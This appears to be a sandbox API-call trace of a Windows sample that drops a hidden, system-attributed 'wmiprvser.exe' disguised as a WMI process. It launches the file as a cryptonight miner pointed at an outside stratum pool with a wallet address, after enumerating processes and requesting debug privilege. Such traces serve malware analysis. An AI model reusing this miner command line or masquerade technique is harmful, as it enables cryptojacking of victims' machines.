api,args,return_value,time
api,arguments,return_value,time
NtAllocateVirtualMemory,0#0#0xffffffff#0x014c0000#8192#4#0#720896#3368,0,1542888172.74975
NtFreeVirtualMemory,0xffffffff#655360#32768#3368#0x014c0000,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x01560000#4096#4#0#4096#3368,0,1542888172.74975
GetFileType,0x00000000,0,1542888172.74975
GetFileType,0x00000000,0,1542888172.74975
GetFileType,0x00000000,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x01561000#4096#4#0#4096#3368,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x01562000#4096#4#0#16384#3368,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x01566000#4096#4#0#28672#3368,0,1542888172.74975
LdrGetDllHandle,0#0x760b0000#KERNEL32,0,1542888172.74975
LdrGetProcedureAddress,IsProcessorFeaturePresent#0#kernel32#0x76106c1e#0x760b0000,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x0156d000#4096#4#0#12288#3368,0,1542888172.74975
SetUnhandledExceptionFilter,,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x00720000#8192#4#0#524288#3368,0,1542888172.74975
NtAllocateVirtualMemory,0#0#0xffffffff#0x00720000#4096#4#0#4096#3368,0,1542888172.74975
GetCursorPos,42#426,1,1542888172.74975
GetSystemMetrics,11,32,1542888172.76575
GetSystemMetrics,12,32,1542888172.76575
GetSystemMetrics,2,17,1542888172.76575
GetSystemMetrics,3,17,1542888172.76575
SetErrorMode,0,32775,1542888172.76575
SetErrorMode,32775,4,1542888172.76575
LoadStringA,#0x00400000#57344,0,1542888172.76575
SetWindowsHookExA,2220#0x00474041#4294967295#0x00000000,4129153,1542888172.76575
OleInitialize,,0,1542888172.76575
NtAllocateVirtualMemory,0#0#0xffffffff#0x01800000#8192#4#0#1048576#3368,0,1542888172.76575
NtAllocateVirtualMemory,0#0#0xffffffff#0x01800000#4096#4#0#16384#3368,0,1542888172.76575
SetWindowsHookExA,2220#0x00470c47#5#0x00000000,4456969,1542888172.76575
NtClose,0x000000d4,0,1542888172.76575
NtClose,0x000000d8,0,1542888172.76575
NtOpenKey,0x000000d8#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\CustomLocale#0x00020019,0,1542888172.76575
NtQueryValueKey,HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\CustomLocale\en-US##0##0x000000d8#1,3221225524,1542888172.76575
NtClose,0x000000d8,0,1542888172.76575
NtOpenKey,0x000000d8#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\ExtendedLocale#0x00020019,0,1542888172.76575
NtQueryValueKey,HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\ExtendedLocale\en-US##0##0x000000d8#1,3221225524,1542888172.76575
NtClose,0x000000d8,0,1542888172.76575
NtClose,0x000000d8,0,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
NtAllocateVirtualMemory,0#0#0xffffffff#0x017cd000#4096#4#0#4096#3368,0,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
LdrLoadDll,0#0#0x747a0000#dwmapi#dwmapi.dll,0,1542888172.76575
LdrGetProcedureAddress,DwmIsCompositionEnabled#0#dwmapi#0x747a1610#0x747a0000,0,1542888172.76575
GetSystemMetrics,0,800,1542888172.76575
GetSystemMetrics,1,600,1542888172.76575
NtAllocateVirtualMemory,0#0#0xffffffff#0x017ce000#4096#4#0#4096#3368,0,1542888172.76575
FindResourceExW,DEFAULT_ICON#0x00400000#0##14,6532056,1542888172.76575
LoadResource,0x0063abd8#0x00400000#0x00647140,6582592,1542888172.76575
FindResourceExW,#5#0x00400000#0##3,6531592,1542888172.76575
LoadResource,0x0063aa08#0x00400000#0x0064359c,6567324,1542888172.76575
FindResourceExW,DEFAULT_ICON#0x00400000#0##14,6532056,1542888172.76575
LoadResource,0x0063abd8#0x00400000#0x00647140,6582592,1542888172.76575
FindResourceExW,#7#0x00400000#0##3,6531624,1542888172.76575
LoadResource,0x0063aa28#0x00400000#0x00644fcc,6574028,1542888172.76575
LdrGetDllHandle,0#0x00400000#C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe,0,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,50,16,1542888172.76575
GetSystemMetrics,12,32,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
GetSystemMetrics,31,21,1542888172.76575
FindFirstFileExW,C:\Program Files\Common Files\Services\wmiprvser.exe#C:\Program Files\Common Files\Services\wmiprvser.exe,4294967295,1542888172.76575
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.76575
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.76575
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,GetSystemDirectoryA#0#kernel32#0x760f94c7#0x760b0000,0,1542888172.78175
GetSystemDirectoryA,C:\Windows\system32,19,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,LoadLibraryA#0#kernel32#0x760fdc65#0x760b0000,0,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#C:\Windows\system32\kernel32.dll,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,GetProcAddress#0#kernel32#0x760fcc94#0x760b0000,0,1542888172.78175
LdrGetProcedureAddress,IsWow64Process#0#kernel32#0x760f5476#0x760b0000,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,GetCurrentProcess#0#kernel32#0x760fd7a0#0x760b0000,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,IsWow64Process#0#kernel32#0x760f5476#0x760b0000,0,1542888172.78175
NtAllocateVirtualMemory,0#0#0xffffffff#0x01804000#4096#4#0#36864#3368,0,1542888172.78175
NtOpenFile,0x000000e0#16417#1#0x00100000#C:\#0#\??\C:\,0,1542888172.78175
NtQueryInformationFile,0x000000e0#9,0,1542888172.78175
NtClose,0x000000e0,0,1542888172.78175
NtCreateFile,0x000000e0#96#2#0x40100080#C:\Program Files\Common Files\Services\wmiprvser.exe#\??\C:\Program Files\Common Files\Services\wmiprvser.exe#128#5#0,0,1542888172.78175
NtClose,0x000000e0,0,1542888172.78175
SetFileAttributesW,C:\Program Files\Common Files\Services\wmiprvser.exe#7#C:\Program Files\Common Files\Services\wmiprvser.exe,1,1542888172.78175
CreateProcessInternalW,0#0#0##0#0x00000000##C:\Program Files\Common Files\Services\wmiprvser.exe -a cryptonight -o stratum+tcp://etn.4i7i.com:13333 -u etnk4YNUvrWiBBkN9Aq8VP6BKNHezthPTHHzUW3prKgKR4a8hRWqC3aSdZzidGiUuh97jPiwTsik1gD7AcK42xRy16RrgYPfWL -p x --donate-level=1#0x00000000##0#0,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,GetCurrentProcessId#0#kernel32#0x760fd7b5#0x760b0000,0,1542888172.78175
LdrLoadDll,0#0#0x760b0000#Kernel32#Kernel32.dll,0,1542888172.78175
LdrGetProcedureAddress,OpenProcess#0#kernel32#0x760f54e7#0x760b0000,0,1542888172.78175
NtOpenProcess,0x000000e0#3368#0x001f0fff,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.78175
LdrGetProcedureAddress,OpenProcessToken#0#ADVAPI32#0x77744304#0x77730000,0,1542888172.78175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.78175
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.79675
LdrGetProcedureAddress,LookupPrivilegeValueA#0#ADVAPI32#0x7774404a#0x77730000,0,1542888172.79675
LookupPrivilegeValueW,SeDebugPrivilege#,1,1542888172.79675
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.79675
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.79675
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.79675
LdrGetProcedureAddress,AdjustTokenPrivileges#0#ADVAPI32#0x7774418e#0x77730000,0,1542888172.79675
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32,3221225781,1542888172.79675
LdrLoadDll,0#0#0x00000000#kernel32#C:\Users\mag\AppData\Local\Temp\kernel32,3221225781,1542888172.79675
LdrLoadDll,0#0#0x760b0000#kernel32#kernel32,0,1542888172.79675
LdrGetProcedureAddress,CloseHandle#0#kernel32#0x760fe868#0x760b0000,0,1542888172.79675
NtClose,0x000000e0,0,1542888172.79675
LdrLoadDll,0#0#0x760b0000#Kernel32#Kernel32.dll,0,1542888172.79675
LdrGetProcedureAddress,CreateToolhelp32Snapshot#0#kernel32#0x760efd29#0x760b0000,0,1542888172.79675
CreateToolhelp32Snapshot,2#0,224,1542888172.79675
LdrLoadDll,0#0#0x760b0000#Kernel32#Kernel32.dll,0,1542888172.79675
LdrGetProcedureAddress,Process32First#0#kernel32#0x761161ed#0x760b0000,0,1542888172.79675
Process32FirstW,0x000000e0#[System Process]#0,1,1542888172.79675
LdrLoadDll,0#0#0x760b0000#Kernel32#Kernel32.dll,0,1542888172.79675
LdrGetProcedureAddress,Process32Next#0#kernel32#0x761162b5#0x760b0000,0,1542888172.79675
Process32NextW,0x000000e0#System#4,1,1542888172.79675
Process32NextW,0x000000e0#smss.exe#256,1,1542888172.81275
Process32NextW,0x000000e0#csrss.exe#324,1,1542888172.81275
Process32NextW,0x000000e0#wininit.exe#360,1,1542888172.81275
Process32NextW,0x000000e0#csrss.exe#372,1,1542888172.81275
Process32NextW,0x000000e0#winlogon.exe#412,1,1542888172.81275
Process32NextW,0x000000e0#services.exe#460,1,1542888172.81275
Process32NextW,0x000000e0#lsass.exe#468,1,1542888172.81275
Process32NextW,0x000000e0#lsm.exe#480,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#580,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#660,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#760,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#800,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#832,1,1542888172.81275
Process32NextW,0x000000e0#audiodg.exe#896,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#936,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#992,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#1112,1,1542888172.81275
Process32NextW,0x000000e0#spoolsv.exe#1244,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#1272,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#1408,1,1542888172.81275
Process32NextW,0x000000e0#dwm.exe#1684,1,1542888172.81275
Process32NextW,0x000000e0#taskhost.exe#1856,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#1868,1,1542888172.81275
Process32NextW,0x000000e0#explorer.exe#1996,1,1542888172.81275
Process32NextW,0x000000e0#SearchIndexer.exe#1308,1,1542888172.81275
Process32NextW,0x000000e0#cmd.exe#2504,1,1542888172.81275
Process32NextW,0x000000e0#conhost.exe#2512,1,1542888172.81275
Process32NextW,0x000000e0#sppsvc.exe#2648,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#2684,1,1542888172.81275
Process32NextW,0x000000e0#python.exe#2800,1,1542888172.81275
Process32NextW,0x000000e0#WmiPrvSE.exe#3920,1,1542888172.81275
Process32NextW,0x000000e0#TrustedInstaller.exe#2172,1,1542888172.81275
Process32NextW,0x000000e0#svchost.exe#2324,1,1542888172.81275
Process32NextW,0x000000e0#mscorsvw.exe#3640,1,1542888172.81275
Process32NextW,0x000000e0#taskhost.exe#3240,1,1542888172.81275
Process32NextW,0x000000e0#python.exe#2448,1,1542888172.81275
Process32NextW,0x000000e0#sdclt.exe#2288,1,1542888172.81275
Process32NextW,0x000000e0#wsqmcons.exe#3672,1,1542888172.81275
Process32NextW,0x000000e0#schtasks.exe#2764,1,1542888172.81275
Process32NextW,0x000000e0#09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#3368,1,1542888172.81275
Process32NextW,0x000000e0#SearchProtocolHost.exe#2388,1,1542888172.81275
Process32NextW,0x000000e0#conhost.exe#3464,1,1542888172.81275
Process32NextW,0x000000e0#Ḁ-הּ崴瞨嵣瞨洯瞫#3464,0,1542888172.81275
NtClose,0x000000e0,0,1542888172.81275
NtOpenProcess,0x00000000#0#0x00000001,3221225483,1542888172.81275
LdrLoadDll,0#0#0x760b0000#Kernel32#Kernel32.dll,0,1542888172.81275
LdrGetProcedureAddress,TerminateProcess#0#kernel32#0x760f2c05#0x760b0000,0,1542888172.81275
NtOpenFile,0x000000e0#16417#1#0x00100000#C:\#0#\??\C:\,0,1542888172.81275
NtQueryInformationFile,0x000000e0#9,0,1542888172.81275
NtClose,0x000000e0,0,1542888172.81275
NtCreateFile,0x000000e0#96#1#0x80100080#C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#\??\C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#128#1#1,0,1542888172.81275
SetFilePointer,0x000000e0#0#1,0,1542888172.81275
SetFilePointer,0x000000e0#0#2,2314240,1542888172.81275
SetFilePointer,0x000000e0#0#0,0,1542888172.81275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01a00000#4096#4#0#2318336#3368,0,1542888172.81275
NtClose,0x000000e0,0,1542888172.81275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01c40000#4096#4#0#2318336#3368,0,1542888172.81275
NtFreeVirtualMemory,0xffffffff#2318336#32768#3368#0x01a00000,0,1542888172.81275
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.81275
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.81275
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.81275
LdrGetProcedureAddress,CryptAcquireContextA#0#ADVAPI32#0x777391dd#0x77730000,0,1542888172.81275
LdrLoadDll,0#0#0x75630000#CRYPTSP#CRYPTSP.dll,0,1542888172.81275
LdrGetProcedureAddress,CryptAcquireContextA#0#CRYPTSP#0x756342a3#0x75630000,0,1542888172.81275
CryptAcquireContextA,0###0x00000000#1,0,1542888172.82875
CryptAcquireContextA,8###0x002d1e08#1,1,1542888172.98475
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.98475
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.98475
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.98475
LdrGetProcedureAddress,CryptCreateHash#0#ADVAPI32#0x7773df4e#0x77730000,0,1542888172.98475
LdrGetProcedureAddress,CryptCreateHash#0#CRYPTSP#0x7563556b#0x75630000,0,1542888172.99975
CryptCreateHash,0x002d1e08#0x00008003#0x00000000#0#0x002d1f18,1,1542888172.99975
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.99975
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888172.99975
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888172.99975
LdrGetProcedureAddress,CryptHashData#0#ADVAPI32#0x7773df36#0x77730000,0,1542888172.99975
LdrGetProcedureAddress,CryptHashData#0#CRYPTSP#0x756357b2#0x75630000,0,1542888172.99975
CryptHashData,0##0x002d1f18,1,1542888172.99975
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888173.03175
LdrGetProcedureAddress,CryptGetHashParam#0#ADVAPI32#0x7773df7e#0x77730000,0,1542888173.03175
LdrGetProcedureAddress,CryptGetHashParam#0#CRYPTSP#0x75635ecc#0x75630000,0,1542888173.03175
LdrLoadDll,0#0#0x00000000#user32#C:\Users\mag\AppData\Local\Temp\user32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x00000000#user32#C:\Users\mag\AppData\Local\Temp\user32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x77960000#user32#user32.dll,0,1542888173.03175
LdrGetProcedureAddress,wvsprintfA#0#USER32#0x77973c94#0x77960000,0,1542888173.03175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888173.03175
LdrGetProcedureAddress,CryptDestroyHash#0#ADVAPI32#0x7773df66#0x77730000,0,1542888173.03175
LdrGetProcedureAddress,CryptDestroyHash#0#CRYPTSP#0x75635985#0x75630000,0,1542888173.03175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x00000000#advapi32#C:\Users\mag\AppData\Local\Temp\advapi32.dll,3221225781,1542888173.03175
LdrLoadDll,0#0#0x77730000#advapi32#advapi32.dll,0,1542888173.03175
LdrGetProcedureAddress,CryptReleaseContext#0#ADVAPI32#0x7773e124#0x77730000,0,1542888173.03175
LdrGetProcedureAddress,CryptReleaseContext#0#CRYPTSP#0x75632ef0#0x75630000,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x002eb000#4096#4#0#45056#3368,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x002f6000#4096#4#0#49152#3368,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x00302000#4096#4#0#139264#3368,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x00324000#4096#4#0#143360#3368,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x00347000#4096#4#0#430080#3368,0,1542888173.03175
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b00000#8192#4#0#1048576#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b00000#4096#4#0#438272#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#847872#16384#3368#0x002e1000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b6b000#4096#4#0#438272#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x002e1000#4096#4#0#442368#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#1044480#16384#3368#0x01b01000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b01000#4096#4#0#446464#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b6e000#4096#4#0#454656#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02150000#8192#4#0#2097152#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02150000#4096#4#0#462848#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#1044480#16384#3368#0x01b01000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b01000#4096#4#0#466944#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01b73000#4096#4#0#475136#3368,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x021c1000#4096#4#0#479232#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#1044480#16384#3368#0x01b01000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#528384#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#2093056#16384#3368#0x02151000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#532480#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#528384#32768#3368#0x01570000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#536576#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#532480#32768#3368#0x01700000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#540672#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#536576#32768#3368#0x01570000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#544768#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#540672#32768#3368#0x01700000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#548864#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#544768#32768#3368#0x01570000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#552960#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#548864#32768#3368#0x01700000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#557056#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#552960#32768#3368#0x01570000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#561152#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#557056#32768#3368#0x01700000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#565248#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#561152#32768#3368#0x01570000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#569344#3368,0,1542888173.04675
NtFreeVirtualMemory,0xffffffff#565248#32768#3368#0x01700000,0,1542888173.04675
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#573440#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#569344#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#577536#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#573440#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#581632#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#577536#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#585728#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#581632#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#589824#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#585728#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#593920#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#589824#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#598016#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#593920#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#602112#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#598016#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#606208#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#602112#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#610304#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#606208#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#614400#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#610304#32768#3368#0x01570000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#618496#3368,0,1542888173.06275
NtFreeVirtualMemory,0xffffffff#614400#32768#3368#0x01700000,0,1542888173.06275
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#622592#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#618496#32768#3368#0x01570000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#626688#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#622592#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#630784#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#626688#32768#3368#0x01570000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#634880#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#630784#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#638976#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#634880#32768#3368#0x01570000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#647168#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#638976#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#651264#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#647168#32768#3368#0x01570000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01570000#4096#4#0#655360#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#651264#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#659456#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#655360#32768#3368#0x01570000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#663552#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#659456#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#667648#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#663552#32768#3368#0x02350000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#671744#3368,0,1542888173.07875
NtFreeVirtualMemory,0xffffffff#667648#32768#3368#0x01700000,0,1542888173.07875
NtAllocateVirtualMemory,0#0#0xffffffff#0x01700000#4096#4#0#675840#3368,0,1542888173.07875
